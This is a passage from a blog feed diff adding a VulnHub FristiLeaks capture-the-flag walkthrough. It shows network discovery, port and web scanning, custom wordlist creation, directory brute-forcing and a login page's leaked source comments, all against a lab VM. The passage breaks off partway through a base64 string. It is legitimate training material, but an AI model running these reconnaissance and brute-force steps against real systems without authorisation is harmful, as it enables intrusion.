@@ -4,7 +4,7 @@
   <title><![CDATA[F4l13n5n0w]]></title>
   <link href="http://f4l13n5n0w.github.io/atom.xml" rel="self"/>
   <link href="http://f4l13n5n0w.github.io/"/>
-  <updated>2015-12-25T00:24:40-05:00</updated>
+  <updated>2015-12-29T04:24:08-05:00</updated>
   <id>http://f4l13n5n0w.github.io/</id>
   <author>
     <name><![CDATA[F4l13n5n0w]]></name>
@@ -12,6 +12,1296 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[[VulnHub] FristiLeaks: 1.3]]></title>
+    <link href="http://f4l13n5n0w.github.io/blog/2015/12/29/vulnhub-fristileaks-1-dot-3/"/>
+    <updated>2015-12-29T01:40:24-05:00</updated>
+    <id>http://f4l13n5n0w.github.io/blog/2015/12/29/vulnhub-fristileaks-1-dot-3</id>
+    <content type="html"><![CDATA[<p>&ldquo;A small VM made for a Dutch informal hacker meetup called Fristileaks. Meant to be broken in a few hours without requiring debuggers, reverse engineering, etc..&rdquo;  &ndash; <a href="https://www.vulnhub.com/author/ar0xa,203/">Ar0xA</a></p>
+
+<p><font color="red"><strong>[note!!]</strong></font> VMware users will need to manually edit the VM&rsquo;s MAC address to: 08:00:27:A5:A6:76</p>
+
+<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/fristileaks-13,133/">here</a>.</p>
+
+<!-- more -->
+
+
+<h2>Attacker &amp; Target</h2>
+
+<p>Attacker: Kali2 Linux (<em>10.1.1.130/24</em>)</p>
+
+<p>Target: FristiLeaks: 1.3 (<em>10.1.1.150/24</em>)</p>
+
+<h2>Vulnerability &amp; Exploit</h2>
+
+<p>There is no acutal Vulnerabilities, all you need to do to take down this VM is Enumeration and more enumberation.
+* Create customized dictionary list and brute force to find hidden folders
+* Checking source code / comments
+* Bypass Apache PHP upload verification / whitelist filter
+* Sensitivie information disclosure
+* Local priv escape</p>
+
+<h2>Method</h2>
+
+<ul>
+<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
+<li>Port scanned the target to discover running services and open ports [<font color="FF8000">masscan</font> &amp;&amp; <font color="FF8000">nmap</font>]</li>
+<li>Web application scanned to dig more information about web service [<font color="FF8000">nikto</font>]</li>
+<li>Create customized dictionary list based on the web pages [<font color="FF8000">cewl</font>]</li>
+<li>Brute fuzz to find hidden files and paths [<font color="FF8000">wfuzz</font>]</li>
+<li>Bypass whitelist filter to upload reverse PHP shell</li>
+<li>Crack a simple encryption program to decode secret string and local priviledge escalation</li>
+<li>Enumeration and exploit the misconfigured sudo list to get ROOT</li>
+</ul>
+
+
+<h2>Tools</h2>
+
+<p>All the tools used here can be found in Kali Linux</p>
+
+<ul>
+<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
+<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
+<li><a href="https://nmap.org/">nmap</a></li>
+<li><a href="https://cirt.net/Nikto2">nikto</a></li>
+<li><a href="https://digi.ninja/projects/cewl.php">cewl</a></li>
+<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
+<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
+<li><a href="http://www.edge-security.com/wfuzz.php">wfuzz</a></li>
+<li><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></li>
+</ul>
+
+
+<h2>Walkthrough</h2>
+
+<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/fristileaks# arp-scan -l
+</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
+</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>http://www.nta-monitor.com/tools/arp-scan/<span class="o">)</span>
+</span><span class='line'>10.1.1.1  00:50:56:c0:00:08   VMware, Inc.
+</span><span class='line'>10.1.1.2  00:50:56:fd:d1:6b   VMware, Inc.
+</span><span class='line'>10.1.1.150    08:00:27:a5:a6:76   CADMUS COMPUTER SYSTEMS
+</span><span class='line'>10.1.1.254    00:50:56:e5:d1:58   VMware, Inc.
+</span><span class='line'>
+</span><span class='line'><span class="m">4</span> packets received by filter, <span class="m">0</span> packets dropped by kernel
+</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.661 seconds <span class="o">(</span>96.20 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
+</span><span class='line'>root@kali:~/fristileaks#
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>10.1.1.150</code> is our Target!</p>
+
+<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># Nmap 6.49BETA5 scan initiated Sun Dec 27 06:52:12 2015 as: nmap -sV -v -A -O -p 80 -oN 10.1.1.150_nmap.txt 10.1.1.150</span>
+</span><span class='line'>Nmap scan report <span class="k">for</span> 10.1.1.150
+</span><span class='line'>Host is up <span class="o">(</span>0.00041s latency<span class="o">)</span>.
+</span><span class='line'>PORT   STATE SERVICE VERSION
+</span><span class='line'>80/tcp open  http    Apache httpd 2.2.15 <span class="o">((</span>CentOS<span class="o">)</span> DAV/2 PHP/5.3.3<span class="o">)</span>
+</span><span class='line'><span class="p">|</span> http-methods: GET HEAD POST OPTIONS TRACE
+</span><span class='line'><span class="p">|</span> Potentially risky methods: TRACE
+</span><span class='line'><span class="p">|</span>_See http://nmap.org/nsedoc/scripts/http-methods.html
+</span><span class='line'><span class="p">|</span> http-robots.txt: <span class="m">3</span> disallowed entries
+</span><span class='line'><span class="p">|</span>_/cola /sisi /beer
+</span><span class='line'><span class="p">|</span>_http-server-header: Apache/2.2.15 <span class="o">(</span>CentOS<span class="o">)</span> DAV/2 PHP/5.3.3
+</span><span class='line'><span class="p">|</span>_http-title: Site doesn<span class="err">&#39;</span>t have a title <span class="o">(</span>text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8<span class="o">)</span>.
+</span><span class='line'>MAC Address: 08:00:27:A5:A6:76 <span class="o">(</span>Cadmus Computer Systems<span class="o">)</span>
+</span><span class='line'>Warning: OSScan results may be unreliable because we could not find at least <span class="m">1</span> open and <span class="m">1</span> closed port
+</span><span class='line'>Device <span class="nb">type</span>: general purpose
+</span><span class='line'>Running: Linux 2.6.X<span class="p">|</span>3.X
+</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
+</span><span class='line'>OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
+</span><span class='line'>Uptime guess: 49.708 days <span class="o">(</span>since Sat Nov  <span class="m">7</span> 13:52:17 2015<span class="o">)</span>
+</span><span class='line'>Network Distance: <span class="m">1</span> hop
+</span><span class='line'>TCP Sequence Prediction: <span class="nv">Difficulty</span><span class="o">=</span><span class="m">258</span> <span class="o">(</span>Good luck!<span class="o">)</span>
+</span><span class='line'>IP ID Sequence Generation: All zeros
+</span><span class='line'>
+</span><span class='line'>TRACEROUTE
+</span><span class='line'>HOP RTT     ADDRESS
+</span><span class='line'><span class="m">1</span>   0.41 ms 10.1.1.150
+</span><span class='line'>
+</span><span class='line'>Read data files from: /usr/bin/../share/nmap
+</span><span class='line'>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span><span class='line'><span class="c"># Nmap done at Sun Dec 27 06:52:21 2015 -- 1 IP address (1 host up) scanned in 10.27 seconds</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>based on the result, I noticed that there are three folders:</p>
+
+<ul>
+<li>/cola</li>
+<li>/sisi</li>
+<li>/beer</li>
+</ul>
+
+
+<p>Also, from the response header: <code>Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3</code>, I know the target is running Apache version 2.2.15 which is outdated, and the keyword <code>DAV/2</code> shows that WebDAV should be enabled.</p>
+
+<p>In the meanwhile, I run <code>nikto</code> to scan web vulnerabilities.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nikto -host http://10.1.1.150
+</span><span class='line'>- Nikto v2.1.6
+</span><span class='line'>---------------------------------------------------------------------------
+</span><span class='line'>+ Target IP:          10.1.1.150
+</span><span class='line'>+ Target Hostname:    10.1.1.150
+</span><span class='line'>+ Target Port:        80
+</span><span class='line'>+ Start Time:         2015-12-27 06:53:18 <span class="o">(</span>GMT-5<span class="o">)</span>
+</span><span class='line'>---------------------------------------------------------------------------
+</span><span class='line'>+ Server: Apache/2.2.15 <span class="o">(</span>CentOS<span class="o">)</span> DAV/2 PHP/5.3.3
+</span><span class='line'>+ Server leaks inodes via ETags, header found with file /, inode: 12722, size: 703, mtime: Tue Nov <span class="m">17</span> 13:45:47 2015
+</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
+</span><span class='line'>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+</span><span class='line'>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>
+</span><span class='line'>+ Entry <span class="s1">&#39;/cola/&#39;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
+</span><span class='line'>+ Entry <span class="s1">&#39;/sisi/&#39;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
+</span><span class='line'>+ Entry <span class="s1">&#39;/beer/&#39;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
+</span><span class='line'>+ <span class="s2">&quot;robots.txt&quot;</span> contains <span class="m">3</span> entries which should be manually viewed.
+</span><span class='line'>+ Apache/2.2.15 appears to be outdated <span class="o">(</span>current is at least Apache/2.4.12<span class="o">)</span>. Apache 2.0.65 <span class="o">(</span>final release<span class="o">)</span> and 2.2.29 are also current.
+</span><span class='line'>+ PHP/5.3.3 appears to be outdated <span class="o">(</span>current is at least 5.6.9<span class="o">)</span>. PHP 5.5.25 and 5.4.41 are also current.
+</span><span class='line'>+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE
+</span><span class='line'>+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+</span><span class='line'>+ OSVDB-3268: /icons/: Directory indexing found.
+</span><span class='line'>+ OSVDB-3268: /images/: Directory indexing found.
+</span><span class='line'>+ OSVDB-3268: /images/?pattern<span class="o">=</span>/etc/*<span class="p">&amp;</span><span class="nv">sort</span><span class="o">=</span>name: Directory indexing found.
+</span><span class='line'>+ OSVDB-3233: /icons/README: Apache default file found.
+</span><span class='line'>+ <span class="m">8330</span> requests: <span class="m">0</span> error<span class="o">(</span>s<span class="o">)</span> and <span class="m">16</span> item<span class="o">(</span>s<span class="o">)</span> reported on remote host
+</span><span class='line'>+ End Time:           2015-12-27 06:53:38 <span class="o">(</span>GMT-5<span class="o">)</span> <span class="o">(</span><span class="m">20</span> seconds<span class="o">)</span>
+</span><span class='line'>---------------------------------------------------------------------------
+</span><span class='line'>+ <span class="m">1</span> host<span class="o">(</span>s<span class="o">)</span> tested
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The result just proved what we have found previously but nothing new.</p>
+
+<p>Then I visit the three folders one by one, but keep getting the same responded picture:</p>
+
+<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/fristileaks/1.jpg"></p>
+
+<p>After tried <code>dirbuster</code> with several default dictionary files but nothing found, I decided to make a customized dict list which including all the words displayed in the web pages and images with tool <code>cewl</code>.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/fristileaks# cewl -v -d <span class="m">2</span> -w cewl_dict_list.txt  http://10.1.1.150/
+</span><span class='line'>root@kali:~/fristileaks# cat cewl_dict_list.txt
+</span><span class='line'>Ar0xA
+</span><span class='line'>meneer
+</span><span class='line'>quick
+</span><span class='line'>hackme
+</span><span class='line'>Welcome
+</span><span class='line'>Goal
+</span><span class='line'>get
+</span><span class='line'>UID
+</span><span class='line'>root
+</span><span class='line'>and
+</span><span class='line'><span class="nb">read</span>
+</span><span class='line'>the
+</span><span class='line'>special
+</span><span class='line'>flag
+</span><span class='line'>file
+</span><span class='line'>Timeframe
+</span><span class='line'>should
+</span><span class='line'>doable
+</span><span class='line'>hours
+</span><span class='line'>The
+</span><span class='line'>fristileaks
+</span><span class='line'>motto
+</span><span class='line'>Fristileaks
+</span><span class='line'>2015
+</span><span class='line'>are
+</span><span class='line'>Fristleaks
+</span><span class='line'>barrebas
+</span><span class='line'>rikvduijn
+</span><span class='line'>wez3forsec
+</span><span class='line'>PyroBatNL
+</span><span class='line'>0xDUDE
+</span><span class='line'>annejanbrouwer
+</span><span class='line'>Sander2121
+</span><span class='line'>Reinierk
+</span><span class='line'>DearCharles
+</span><span class='line'>miamat
+</span><span class='line'>MisterXE
+</span><span class='line'>BasB
+</span><span class='line'>Dwight
+</span><span class='line'>Egeltje
+</span><span class='line'>pdersjant
+</span><span class='line'>tcp130x10
+</span><span class='line'>spierenburg
+</span><span class='line'>ielmatani
+</span><span class='line'>renepieters
+</span><span class='line'>Mystery
+</span><span class='line'>guest
+</span><span class='line'>uinix
+</span><span class='line'>WhatSecurity
+</span><span class='line'>mramsmeets
+</span><span class='line'>fristi
+</span><span class='line'>drink
+</span><span class='line'>keep
+</span><span class='line'>calm
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Then I use <code>wfuzz</code> to discover any possible hidden path.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/fristileaks# wfuzz -c -z file,cewl_dict_list.txt --hc <span class="m">404</span> http://10.1.1.150/FUZZ
+</span><span class='line'>
+</span><span class='line'>********************************************************
+</span><span class='line'>* Wfuzz  2.0 - The Web Bruteforcer                     *
+</span><span class='line'>********************************************************
+</span><span class='line'>
+</span><span class='line'>Target: http://10.1.1.150/FUZZ
+</span><span class='line'>Payload <span class="nb">type</span>: file,cewl.txt
+</span><span class='line'>
+</span><span class='line'>Total requests: <span class="nv">54</span>
+</span><span class='line'><span class="o">==================================================================</span>
+</span><span class='line'>ID    Response   Lines      Word         Chars          <span class="nv">Request</span>
+</span><span class='line'><span class="o">==================================================================</span>
+</span><span class='line'>
+</span><span class='line'>00051:  <span class="nv">C</span><span class="o">=</span><span class="m">301</span>      <span class="m">7</span> L         <span class="m">20</span> W       <span class="m">233</span> Ch     <span class="s2">&quot; - fristi&quot;</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>root@kali:~/fristileaks#
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>From the result, there is one folder found <code>fristi</code>.</p>
+
+<p>By visiting the new found path <code>http://10.1.1.150/fristi/</code>, a login page appeared in my firefox.</p>
+
+<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/fristileaks/2.png"></p>
+
+<p>After tried some weak passwords but all failed, I found some clues in the source code.</p>
+
+<p>First thing is that there is a comment written by <code>eezeepz</code>, in the top of the code:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;html&gt;</span>
+</span><span class='line'><span class="nt">&lt;head&gt;</span>
+</span><span class='line'><span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">&quot;description&quot;</span> <span class="na">content=</span><span class="s">&quot;super leet password login-test page. We use base64 encoding for images so they are inline in the HTML. I read somewhere on the web, that thats a good way to do it.&quot;</span><span class="nt">&gt;</span>
+</span><span class='line'><span class="c">&lt;!--</span>
+</span><span class='line'><span class="c">TODO:</span>
+</span><span class='line'><span class="c">We need to clean this up for production. I left some junk in here to make testing easier. </span>
+</span><span class='line'>
+</span><span class='line'><span class="c">- by eezeepz</span>
+</span><span class='line'><span class="c">--&gt;</span>
+</span><span class='line'><span class="nt">&lt;/head&gt;</span>
+</span><span class='line'><span class="nt">&lt;body&gt;</span>
+</span><span class='line'><span class="nt">&lt;center&gt;</span>
+</span><span class='line'><span class="nt">&lt;h1&gt;</span> Welcome to #fristileaks admin portal<span class="nt">&lt;/h1&gt;</span>
+</span><span class='line'><span class="nt">&lt;/center&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>and another comment, which is a base64 encoded string, has been inserted at the very bottom of the source code:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="c">&lt;!--</span>
+</span><span class='line'><span class="c">iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl S0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixw B4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+f m63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJ Zv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvb DpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNd jJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU 12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5 uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg1 04VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLq i1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2Fg tOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws 30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl 3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HK ul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12q mD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34 rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFhe EPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLH AHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk CwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJR U5ErkJggg==</span>
+</span><span class='line'><span class="c">--&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><font color="red">[note!!]</font> before decoding, we have to remove newlines from each line, <code>tr</code> can be used to fix that:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/fristileaks# cat test.txt
+</span><span class='line'>
+</span><span class='line'>iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx
+</span><span class='line'>jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl
+</span><span class='line'>S0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixw
+</span><span class='line'>B4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+f
+</span><span class='line'>m63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJ
+</span><span class='line'>Zv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvb
+</span><span class='line'>DpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNd
+</span><span class='line'>jJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU
+</span><span class='line'>12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5
+</span><span class='line'>uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg1
+</span><span class='line'>04VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLq
+</span><span class='line'>i1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2Fg
+</span><span class='line'>tOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws
+</span><span class='line'>30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl
+</span><span class='line'>3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HK
+</span><span class='line'>ul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12q
+</span><span class='line'>mD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34
+</span><span class='line'>rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFhe
+</span><span class='line'>EPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLH
+</span><span class='line'>AHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk
+</span><span class='line'>CwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJR
